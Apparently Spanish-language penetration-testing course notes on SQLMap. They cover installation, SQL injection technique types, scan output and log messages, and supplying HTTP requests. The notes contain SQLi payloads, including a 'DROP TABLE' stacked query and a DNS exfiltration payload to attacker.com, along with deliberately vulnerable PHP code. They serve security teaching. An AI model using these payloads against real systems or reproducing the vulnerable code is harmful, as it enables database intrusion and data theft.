---
tags:
  - HTB-Academy
  - Penetration-Tester
---

# Descripción general de SQLMap

---

[SQLMap](https://github.com/sqlmapproject/sqlmap) es una herramienta de prueba de penetración gratuita y de código abierto escrita en Python que automatiza el proceso de detección y explotación de fallas de inyección SQL (SQLi). SQLMap se ha desarrollado continuamente desde 2006 y todavía se mantiene hoy.

  Descripción general de SQLMap

```shell-session
vcrdcr@htb[/htb]$ python sqlmap.py -u 'http://inlanefreight.htb/page.php?id=5'

       ___
       __H__
 ___ ___[']_____ ___ ___  {1.3.10.41#dev}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 12:55:56

[12:55:56] [INFO] testing connection to the target URL
[12:55:57] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[12:55:58] [INFO] testing if the target URL content is stable
[12:55:58] [INFO] target URL content is stable
[12:55:58] [INFO] testing if GET parameter 'id' is dynamic
[12:55:58] [INFO] confirming that GET parameter 'id' is dynamic
[12:55:59] [INFO] GET parameter 'id' is dynamic
[12:55:59] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[12:56:00] [INFO] testing for SQL injection on GET parameter 'id'
<...SNIP...>
```

SQLMap viene con un potente motor de detección, numerosas características y una amplia gama de opciones e interruptores para ajustar los muchos aspectos de la misma, tales como:

||||
|---|---|---|
|Conexión objetivo|Detección por inyección|Huellas dactilares|
|Enumeración|Optimización|Detección de protección y derivación usando scripts "tamper"|
|Recuperación de contenido de base de datos|Acceso al sistema de archivos|Ejecución de los comandos del sistema operativo (OS)|

---

## Instalación SQLMap

SQLMap está preinstalado en su Pwnbox y en la mayoría de los sistemas operativos centrados en la seguridad. SQLMap también se encuentra en muchas bibliotecas de Linux Distributions. Por ejemplo, en Debian, se puede instalar con:

  Descripción general de SQLMap

```shell-session
vcrdcr@htb[/htb]$ sudo apt install sqlmap
```

Si queremos instalar manualmente, podemos utilizar el siguiente comando en el terminal Linux o en la línea de comandos de Windows:

  Descripción general de SQLMap

```shell-session
vcrdcr@htb[/htb]$ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
```

Después de eso, SQLMap se puede ejecutar con:

  Descripción general de SQLMap

```shell-session
vcrdcr@htb[/htb]$ python sqlmap.py
```

---

## Bases de datos compatibles

SQLMap tiene el mayor soporte para DBMS de cualquier otra herramienta de explotación SQL. SQLMap es totalmente compatible con los siguientes DBMS:

|||||
|---|---|---|---|
|`MySQL`|`Oracle`|`PostgreSQL`|`Microsoft SQL Server`|
|`SQLite`|`IBM DB2`|`Microsoft Access`|`Firebird`|
|`Sybase`|`SAP MaxDB`|`Informix`|`MariaDB`|
|`HSQLDB`|`CockroachDB`|`TiDB`|`MemSQL`|
|`H2`|`MonetDB`|`Apache Derby`|`Amazon Redshift`|
|`Vertica`, `Mckoi`|`Presto`|`Altibase`|`MimerSQL`|
|`CrateDB`|`Greenplum`|`Drizzle`|`Apache Ignite`|
|`Cubrid`|`InterSystems Cache`|`IRIS`|`eXtremeDB`|
|`FrontBase`||||

El equipo de SQLMap también trabaja para agregar y admitir nuevos DBMS periódicamente.

---

## Tipos de inyección SQL compatibles

SQLMap es la única herramienta de prueba de penetración que puede detectar y explotar adecuadamente todos los tipos de SQLi conocidos. Vemos los tipos de inyecciones SQL compatibles con SQLMap con el `sqlmap -hh` comando:

  Descripción general de SQLMap

```shell-session
vcrdcr@htb[/htb]$ sqlmap -hh
...SNIP...
  Techniques:
    --technique=TECH..  SQL injection techniques to use (default "BEUSTQ")
```

Los personajes de la técnica `BEUSTQ` se refiere a lo siguiente:

- `B`: Boolean-based blind
- `E`: Error-based
- `U`: Union query-based
- `S`: Stacked queries
- `T`: Time-based blind
- `Q`: Inline queries

---

## Inyección SQL ciega basada en booleanos

Ejemplo de `Boolean-based blind SQL Injection`:

Código: sql

```sql
AND 1=1
```

exploits de SQLMap `Boolean-based blind SQL Injection` vulnerabilidades a través de la diferenciación de `TRUE` de `FALSE` resultados de la consulta, recuperando efectivamente 1 byte de información por solicitud. La diferenciación se basa en la comparación de las respuestas del servidor para determinar si la consulta SQL regresó `TRUE` o `FALSE`. Esto abarca desde comparaciones difusas de contenido de respuesta sin procesar, códigos HTTP, títulos de página, texto filtrado y otros factores.

- `TRUE`los resultados generalmente se basan en respuestas que no tienen ninguna diferencia o marginal en la respuesta regular del servidor.
    
- `FALSE`los resultados se basan en respuestas que tienen diferencias sustanciales con respecto a la respuesta regular del servidor.
    
- `Boolean-based blind SQL Injection`se considera como el tipo SQLi más común en las aplicaciones web.
    

---

## Inyección SQL basada en errores

Ejemplo de `Error-based SQL Injection`:

Código: sql

```sql
AND GTID_SUBSET(@@version,0)
```

Si el `database management system` (`DBMS`) los errores se devuelven como parte de la respuesta del servidor para cualquier problema relacionado con la base de datos, luego existe la probabilidad de que se puedan usar para llevar los resultados de las consultas solicitadas. En tales casos, se utilizan cargas útiles especializadas para el DBMS actual, dirigidas a las funciones que causan malos comportamientos conocidos. SQLMap tiene la lista más completa de tales cargas útiles y cubiertas relacionadas `Error-based SQL Injection` para los siguientes DBMS:

||||
|---|---|---|
|MySQL|PostgreSQL|Oráculo|
|Microsoft SQL Server|Sybase|Vertica|
|DB2 IBM|Pájaro|MonetDB|

SQLi basado en errores se considera más rápido que todos los demás tipos, excepto basado en consultas UNION, ya que puede recuperar una cantidad limitada (por ejemplo, 200 bytes) de datos llamados "chunks" a través de cada solicitud.

---

## UNION basado en consultas

Ejemplo de `UNION query-based SQL Injection`:

Código: sql

```sql
UNION ALL SELECT 1,@@version,3
```

Con el uso de `UNION`, generalmente es posible extender el original (`vulnerable`) consulta con los resultados de las declaraciones inyectadas. De esta manera, si los resultados de la consulta original se representan como parte de la respuesta, el atacante puede obtener resultados adicionales de las instrucciones inyectadas dentro de la propia respuesta de la página. Este tipo de inyección SQL se considera la más rápida, ya que, en el escenario ideal, el atacante podría extraer el contenido de toda la tabla de la base de datos de interés con una sola solicitud.

---

## Consultas apiladas

Ejemplo de `Stacked Queries`:

Código: sql

```sql
; DROP TABLE users
```

Apilar consultas SQL, también conocidas como "piggy-backing", es la forma de inyectar sentencias SQL adicionales después de la vulnerable. En caso de que exista un requisito para ejecutar declaraciones que no sean de consulta (por ejemplo. `INSERT`, `UPDATE` o `DELETE`), el apilamiento debe ser soportado por la plataforma vulnerable (por ejemplo `Microsoft SQL Server` y `PostgreSQL` soporte por defecto). SQLMap puede usar dichas vulnerabilidades para ejecutar sentencias que no son de consulta ejecutadas en funciones avanzadas (por ejemplo, ejecución de comandos del SO) y recuperación de datos de manera similar a los tipos SQLi ciegos basados en el tiempo.

---

## Inyección SQL ciega basada en el tiempo

Ejemplo de `Time-based blind SQL Injection`:

Código: sql

```sql
AND 1=IF(2>1,SLEEP(5),0)
```

El principio de `Time-based blind SQL Injection` es similar a la `Boolean-based blind SQL Injection`, pero aquí el tiempo de respuesta se utiliza como la fuente para la diferenciación entre `TRUE` o `FALSE`.

- `TRUE`la respuesta generalmente se caracteriza por la diferencia notable en el tiempo de respuesta en comparación con la respuesta regular del servidor
    
- `FALSE`la respuesta debe dar como resultado un tiempo de respuesta indistinguible de los tiempos de respuesta regulares
    

`Time-based blind SQL Injection` es considerablemente más lento que el SQLi ciego basado en booleanos, ya que las consultas resultan en `TRUE` retrasaría la respuesta del servidor. Este tipo SQLi se utiliza en los casos en que `Boolean-based blind SQL Injection` no es aplicable. Por ejemplo, en caso de que la instrucción SQL vulnerable no sea una consulta (por ejemplo. `INSERT`, `UPDATE` o `DELETE`), ejecutado como parte de la funcionalidad auxiliar sin ningún efecto en el proceso de renderizado de páginas, SQLi basado en el tiempo se utiliza por necesidad, como `Boolean-based blind SQL Injection` realmente no funcionaría en este caso.

---

## Consultas en línea

Ejemplo de `Inline Queries`:

Código: sql

```sql
SELECT (SELECT @@version) from
```

Este tipo de inyección incrustó una consulta dentro de la consulta original. Dicha inyección SQL es poco común, ya que necesita que la aplicación web vulnerable se escriba de cierta manera. Aún así, SQLMap también admite este tipo de SQLi.

---

## Inyección SQL Fuera de banda

Ejemplo de `Out-of-band SQL Injection`:

Código: sql

```sql
LOAD_FILE(CONCAT('\\\\',@@version,'.attacker.com\\README.txt'))
```

Esto se considera uno de los tipos más avanzados de SQLi, utilizado en los casos en que todos los demás tipos no son compatibles con la aplicación web vulnerable o son demasiado lentos (por ejemplo, SQLi ciego basado en el tiempo). SQLMap admite SQLi fuera de banda a través de "DNS exfiltration", donde las consultas solicitadas se recuperan a través del tráfico DNS.

Ej., ejecutando SQLMap en el servidor DNS para el dominio bajo control (por ejemplo. `.attacker.com`), SQLMap puede realizar el ataque forzando al servidor a solicitar subdominios inexistentes (por ejemplo. `foo.attacker.com`), donde `foo` sería la respuesta SQL que queremos recibir. SQLMap puede recopilar estas solicitudes DNS de error y recopilar el `foo` parte, para formar toda la respuesta SQL.


# Comenzando con SQLMap

---

Al comenzar a usar SQLMap, la primera parada para nuevos usuarios suele ser el mensaje de ayuda del programa. Para ayudar a los nuevos usuarios, hay dos niveles de lista de mensajes de ayuda:

- `Basic Listing` muestra solo las opciones básicas y los interruptores, suficientes en la mayoría de los casos (interruptor `-h`):

  Comenzando con SQLMap

```shell-session
vcrdcr@htb[/htb]$ sqlmap -h
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9#stable}
|_ -| . ["]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -g GOOGLEDORK       Process Google dork results as target URLs
...SNIP...
```

- `Advanced Listing` muestra todas las opciones y conmutadores (conmutador `-hh`):

  Comenzando con SQLMap

```shell-session
vcrdcr@htb[/htb]$ sqlmap -hh
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.4.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

Usage: python3 sqlmap [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  -v VERBOSE            Verbosity level: 0-6 (default 1)

  Target:
    At least one of these options has to be provided to define the
    target(s)

    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
    -d DIRECT           Connection string for direct database connection
    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
    -m BULKFILE         Scan multiple targets given in a textual file
    -r REQUESTFILE      Load HTTP request from a file
    -g GOOGLEDORK       Process Google dork results as target URLs
    -c CONFIGFILE       Load options from a configuration INI file

  Request:
    These options can be used to specify how to connect to the target URL

    -A AGENT, --user..  HTTP User-Agent header value
    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
    --data=DATA         Data string to be sent through POST (e.g. "id=1")
    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
...SNIP...
```

Para obtener más detalles, se recomienda a los usuarios que consulten el proyecto [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage), ya que representa el manual oficial para el uso de SQLMap.

---

## Escenario Básico

En un escenario simple, un probador de penetración accede a la página web que acepta la entrada del usuario a través de un `GET` parámetro (por ejemplo `id`). Luego quieren probar si la página web se ve afectada por la vulnerabilidad de inyección SQL. Si es así, querrían explotarlo, recuperar tanta información como sea posible de la base de datos de back-end, o incluso intentar acceder al sistema de archivos subyacente y ejecutar comandos del SO. Un ejemplo de código PHP vulnerable SQLi para este escenario se vería de la siguiente manera:

Código: php

```php
$link = mysqli_connect($host, $username, $password, $database, 3306);
$sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
$result = mysqli_query($link, $sql);
if (!$result)
    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
```

Como el informe de errores está habilitado para la consulta SQL vulnerable, se devolverá un error de base de datos como parte de la respuesta del servidor web en caso de problemas de ejecución de consultas SQL. Tales casos facilitan el proceso de detección de SQLi, especialmente en caso de manipulación manual del valor del parámetro, ya que los errores resultantes se reconocen fácilmente:

   

![Página con título 'Lorem Ipsum', mensaje de error SQL y explicación del uso de Lorem Ipsum.](https://academy.hackthebox.com/storage/modules/58/rOrm8tC.png)

Para ejecutar SQLMap contra este ejemplo, ubicado en la URL de ejemplo `http://www.example.com/vuln.php?id=1`, se vería como el siguiente:

  Comenzando con SQLMap

```shell-session
vcrdcr@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.4.9}
|_ -| . [,]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 22:26:45 /2020-09-09/

[22:26:45] [INFO] testing connection to the target URL
[22:26:45] [INFO] testing if the target URL content is stable
[22:26:46] [INFO] target URL content is stable
[22:26:46] [INFO] testing if GET parameter 'id' is dynamic
[22:26:46] [INFO] GET parameter 'id' appears to be dynamic
[22:26:46] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[22:26:46] [INFO] heuristic (XSS) test shows that GET parameter 'id' might be vulnerable to cross-site scripting (XSS) attacks
[22:26:46] [INFO] testing for SQL injection on GET parameter 'id'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[22:26:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[22:26:46] [WARNING] reflective value(s) found and filtering out
[22:26:46] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="luther")
[22:26:46] [INFO] testing 'Generic inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[22:26:46] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
...SNIP...
[22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[22:26:46] [INFO] testing 'MySQL inline queries'
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       
...SNIP...
[22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[22:26:56] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[22:26:56] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[22:26:56] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[22:26:56] [INFO] target URL appears to have 3 columns in query
[22:26:56] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 8814=8814

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
---
[22:26:56] [INFO] the back-end DBMS is MySQL
web application technology: PHP 5.2.6, Apache 2.2.9
back-end DBMS: MySQL >= 5.0
[22:26:57] [INFO] fetched data logged to text files under '/home/user/.sqlmap/output/www.example.com'

[*] ending @ 22:26:57 /2020-09-09/
```

Nota: en este caso, la opción '-u' se utiliza para proporcionar la URL de destino, mientras que el interruptor '- lote' se utiliza para omitir cualquier entrada de usuario requerida, eligiendo automáticamente utilizando la opción predeterminada.


# Descripción de salida de SQLMap

---

Al final de la sección anterior, la salida sqlmap nos mostró mucha información durante su escaneo. Estos datos suelen ser cruciales de entender, ya que nos guían a través del proceso automatizado de inyección SQL. Esto nos muestra exactamente qué tipo de vulnerabilidades está explotando SQLMap, lo que nos ayuda a informar qué tipo de inyección tiene la aplicación web. Esto también puede ser útil si queremos explotar manualmente la aplicación web una vez que SQLMap determina el tipo de inyección y el parámetro vulnerable.

---

## Descripción de Mensajes de Registro

Los siguientes son algunos de los mensajes más comunes que generalmente se encuentran durante un escaneo de SQLMap, junto con un ejemplo de cada uno del ejercicio anterior y su descripción.

#### El contenido de la URL es estable

`Log Message:`

- "el contenido de URL de destino es estable"

Esto significa que no hay cambios importantes entre las respuestas en caso de solicitudes idénticas continuas. Esto es importante desde el punto de vista de la automatización ya que, en el caso de respuestas estables, es más fácil detectar las diferencias causadas por los posibles intentos de SQLi. Si bien la estabilidad es importante, SQLMap tiene mecanismos avanzados para eliminar automáticamente el potencial "ruido" que podría provenir de objetivos potencialmente inestables.

#### El parámetro parece ser dinámico

`Log Message:`

- "El parámetro GET 'id' parece ser dinámico"

Siempre se desea que el parámetro probado sea "dinámico", ya que es una señal de que cualquier cambio realizado en su valor resultaría en un cambio en la respuesta; por lo tanto, el parámetro puede estar vinculado a una base de datos. En caso de que la salida sea "estática" y no cambie, podría ser un indicador de que el valor del parámetro probado no es procesado por el objetivo, al menos en el contexto actual.

#### El parámetro puede ser inyectable

`Log Message:`"la prueba heurística (básica) muestra que el parámetro GET 'id' podría ser inyectable (posible DBMS: 'MySQL')"

Como se discutió anteriormente, los errores de DBMS son una buena indicación del potencial SQLi. En este caso, hubo un error de MySQL cuando SQLMap envía un valor intencionalmente no válido que se utilizó (por ejemplo. `?id=1",)..).))'`), lo que indica que el parámetro probado podría ser SQLi inyectable y que el objetivo podría ser MySQL. Cabe señalar que esto no es una prueba de SQLi, sino solo una indicación de que el mecanismo de detección debe probarse en la ejecución posterior.

#### El parámetro puede ser vulnerable a los ataques XSS

`Log Message:`

- "la prueba heurística (XSS) muestra que el parámetro GET 'id' podría ser vulnerable a ataques de secuencias de comandos en sitios cruzados (XSS)"

Si bien no es su propósito principal, SQLMap también ejecuta una prueba heurística rápida para detectar la presencia de una vulnerabilidad XSS. En pruebas a gran escala, donde se están probando muchos parámetros con SQLMap, es bueno tener este tipo de comprobaciones heurísticas rápidas, especialmente si no se encuentran vulnerabilidades SQLi.

#### Back-end DBMS es '...'

`Log Message:`

- "parece que el DBMS de back-end es 'MySQL'. ¿Desea omitir cargas útiles de prueba específicas para otros DBMS? [Y/n]"

En una ejecución normal, SQLMap prueba para todos los DBMS compatibles. En caso de que haya una indicación clara de que el objetivo está utilizando el DBMS específico, podemos reducir las cargas útiles a solo ese DBMS específico.

#### Nivel/valores de riesgo

`Log Message:`

- "para las pruebas restantes, ¿desea incluir todas las pruebas para 'MySQL' que amplían los valores de nivel (1) y riesgo (1) proporcionados? [Y/n]"

Si hay una indicación clara de que el objetivo utiliza el DBMS específico, también es posible extender las pruebas para ese mismo DBMS específico más allá de las pruebas regulares.  
Básicamente, esto significa ejecutar todas las cargas útiles de inyección SQL para ese DBMS específico, mientras que si no se detectasen DBMS, solo se probarían las cargas útiles superiores.

#### Valores reflectantes encontrados

`Log Message:`

- "valor reflectante(s) encontrado y filtrado"

Solo una advertencia de que partes de las cargas útiles utilizadas se encuentran en la respuesta. Este comportamiento podría causar problemas a las herramientas de automatización, ya que representa la basura. Sin embargo, SQLMap tiene mecanismos de filtrado para eliminar dicha basura antes de comparar el contenido de la página original.

#### El parámetro parece ser inyectable

`Log Message:`

- "GET parámetro 'id' parece ser 'AND boolean-based blind - WHERE or HAVING clause' inyectable (con --string="luther")"

Este mensaje indica que el parámetro parece ser inyectable, aunque todavía existe la posibilidad de que sea un hallazgo falso positivo. En el caso de los tipos SQLi ciegos y similares basados en booleanos (por ejemplo, ciegos basados en el tiempo), donde hay una alta probabilidad de falsos positivos, al final de la ejecución, SQLMap realiza pruebas exhaustivas que consisten en simples comprobaciones lógicas para la eliminación de hallazgos falsos positivos.

Además, `with --string="luther"` indica que SQLMap reconoció y utilizó la apariencia del valor de cadena constante `luther` en la respuesta para distinguir `TRUE` de `FALSE` respuestas. Este es un hallazgo importante porque en tales casos, no hay necesidad del uso de mecanismos internos avanzados, como la eliminación de la dinamicidad/reflexión o la comparación difusa de las respuestas, que no pueden considerarse como falsos positivos.

#### Modelo estadístico de comparación basado en el tiempo

`Log Message:`

- "la comparación basada en el tiempo requiere un modelo estadístico más grande, espere........ (hecho)"

SQLMap utiliza un modelo estadístico para el reconocimiento de respuestas objetivo regulares y (deliberadamente) retrasadas. Para que este modelo funcione, existe el requisito de recopilar un número suficiente de tiempos de respuesta regulares. De esta manera, SQLMap puede distinguir estadísticamente entre el retraso deliberado incluso en los entornos de red de alta latencia.

#### Extender las pruebas de la técnica de inyección de consultas de UNION

`Log Message:`

- "extender automáticamente los rangos para las pruebas de la técnica de inyección de consultas UNION, ya que se encuentra al menos otra técnica (potencial)"

Las comprobaciones SQLi de UNION-Query requieren considerablemente más solicitudes de reconocimiento exitoso de la carga útil utilizable que otros tipos SQLi. Para reducir el tiempo de prueba por parámetro, especialmente si el objetivo no parece ser inyectable, el número de solicitudes se limita a un valor constante (es decir, 10) para este tipo de verificación. Sin embargo, si hay una buena probabilidad de que el objetivo sea vulnerable, especialmente cuando se encuentra otra técnica SQLi (potencial), SQLMap amplía el número predeterminado de solicitudes para la consulta UNION SQLi, debido a una mayor expectativa de éxito.

#### La técnica parece ser utilizable

`Log Message:`

- La técnica "ORDER BY' parece ser utilizable. Esto debería reducir el tiempo necesario para encontrar el número correcto de columnas de consulta. Ampliar automáticamente el rango para la prueba actual de la técnica de inyección de consultas de UNION"

Como una verificación heurística para el tipo SQLi de la consulta UNION, antes de la real `UNION` se envían cargas útiles, una técnica conocida como `ORDER BY` se comprueba la usabilidad. En caso de que sea utilizable, SQLMap puede reconocer rápidamente el número correcto de requerido `UNION` columnas mediante la realización del enfoque de búsqueda binaria.

Tenga en cuenta que esto depende de la tabla afectada en la consulta vulnerable.

#### El parámetro es vulnerable

`Log Message:`

- "El parámetro GET 'id' es vulnerable. ¿Quieres seguir probando a los otros (si los hay)? [y/N]"

Este es uno de los mensajes más importantes de SQLMap, ya que significa que se encontró que el parámetro era vulnerable a las inyecciones de SQL. En los casos regulares, el usuario solo puede querer encontrar al menos un punto de inyección (es decir, parámetro) utilizable contra el objetivo. Sin embargo, si estábamos ejecutando una prueba extensa en la aplicación web y queremos informar de todas las vulnerabilidades potenciales, podemos seguir buscando todos los parámetros vulnerables.

#### Sqlmap identificó puntos de inyección

`Log Message:`

- "sqlmap identificó el siguiente punto de inyección(s) con un total de 46 peticiones HTTP(s):"

A continuación se muestra una lista de todos los puntos de inyección con tipo, título y cargas útiles, que representa la prueba final de la detección y explotación exitosas de las vulnerabilidades SQLi encontradas. Cabe señalar que SQLMap enumera solo aquellos hallazgos que son demostrablemente explotables (es decir, utilizables).

#### Datos registrados en archivos de texto

`Log Message:`

- "datos grabados registrados en archivos de texto en '/home/user/.sqlmap/output/www.example.com'"

Esto indica la ubicación del sistema de archivos local utilizada para almacenar todos los registros, sesiones y datos de salida para un objetivo específico, en este caso `www.example.com`. Después de una ejecución inicial de este tipo, donde el punto de inyección se detecta con éxito, todos los detalles para futuras ejecuciones se almacenan dentro de los archivos de sesión del mismo directorio. Esto significa que SQLMap intenta reducir las solicitudes de destino requeridas tanto como sea posible, dependiendo de los datos de los archivos de sesión.


# Ejecución de SQLMap en una solicitud HTTP

---

SQLMap tiene numerosas opciones y conmutadores que se pueden utilizar para configurar correctamente la solicitud (HTTP) antes de su uso.

En muchos casos, errores simples como olvidarse de proporcionar valores de cookies adecuados, complicar demasiado la configuración con una línea de comandos larga o una declaración incorrecta de datos POST formateados, evitarán la detección y explotación correctas de la posible vulnerabilidad SQLi.

---

## Comandos Curl

Una de las mejores y más fáciles maneras de configurar correctamente una solicitud SQLMap contra el objetivo específico (es decir, solicitud web con parámetros dentro) es mediante la utilización de `Copy as cURL` característica desde el panel Red (Monitor) dentro de las Herramientas para desarrolladores de Chrome, Edge o Firefox: ![Panel de red que muestra una solicitud GET a www.example.com con un estado 404 y un menú contextual con opciones como 'Copiar como cURL'.](https://academy.hackthebox.com/storage/modules/58/M5UVR6n.png)

Pegando el contenido del portapapeles (`Ctrl-V`) en la línea de comandos y cambiar el comando original `curl` a `sqlmap`, somos capaces de utilizar SQLMap con el idéntico `curl` comando:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

Al proporcionar datos para pruebas a SQLMap, debe haber un valor de parámetro que pueda evaluarse para la vulnerabilidad de SQLi o opciones/interruptores especializados para la búsqueda automática de parámetros (por ejemplo. `--crawl`, `--forms` o `-g`).

---

## Solicitudes GET/POST

En el escenario más común, `GET` los parámetros se proporcionan con el uso de la opción `-u`/`--url`, como en el ejemplo anterior. En cuanto a las pruebas `POST` datos, el `--data` la bandera se puede utilizar, de la siguiente manera:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

En tales casos, `POST` parámetros `uid` y `name` se probará la vulnerabilidad SQLi. Por ejemplo, si tenemos una indicación clara de que el parámetro `uid` es propenso a una vulnerabilidad SQLi, podríamos reducir las pruebas a solo este parámetro usando `-p uid`. De lo contrario, podríamos marcarlo dentro de los datos proporcionados con el uso de un marcador especial `*` como sigue:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

---

## Solicitudes HTTP Completas

Si necesitamos especificar una solicitud HTTP compleja con muchos valores de encabezado diferentes y un cuerpo POST alargado, podemos usar el `-r` bandera. Con esta opción, SQLMap se proporciona con el "archivo de solicitud", que contiene toda la solicitud HTTP dentro de un solo archivo textual. En un escenario común, dicha solicitud HTTP se puede capturar desde una aplicación proxy especializada (por ejemplo. `Burp`) y escrito en el archivo de solicitud, de la siguiente manera:

![Solicitud HTTP GET a www.example.com con encabezados que incluyen User-Agent y Accept-Language.](https://academy.hackthebox.com/storage/modules/58/x7ND6VQ.png)

Un ejemplo de una solicitud HTTP capturada con `Burp` se vería como:

Código: http

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

Podemos copiar manualmente la solicitud HTTP desde dentro `Burp` y escríbalo a un archivo, o podemos hacer clic derecho en la solicitud dentro `Burp` y elegir `Copy to file`. Otra forma de capturar la solicitud HTTP completa sería mediante el uso del navegador, como se mencionó anteriormente en la sección, y elegir la opción `Copy` > `Copy Request Headers`, y luego pegar la solicitud en un archivo.

Para ejecutar SQLMap con un archivo de solicitud HTTP, utilizamos el `-r` bandera, como sigue:

  Ejecución de SQLMap en una solicitud HTTP

```shell-session
vcrdcr@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 14:32:59 /2020-09-11/

[14:32:59] [INFO] parsing HTTP request from 'req.txt'
[14:32:59] [INFO] testing connection to the target URL
[14:32:59] [INFO] testing if the target URL content is stable
[14:33:00] [INFO] target URL content is stable
```

Consejo: de manera similar al caso con la opción '-datos', dentro del archivo de solicitud guardado, podemos especificar el parámetro que queremos inyectar con un asterisco (*), como '/?.id=*'.

---

## Solicitudes de SQLMap Personalizadas

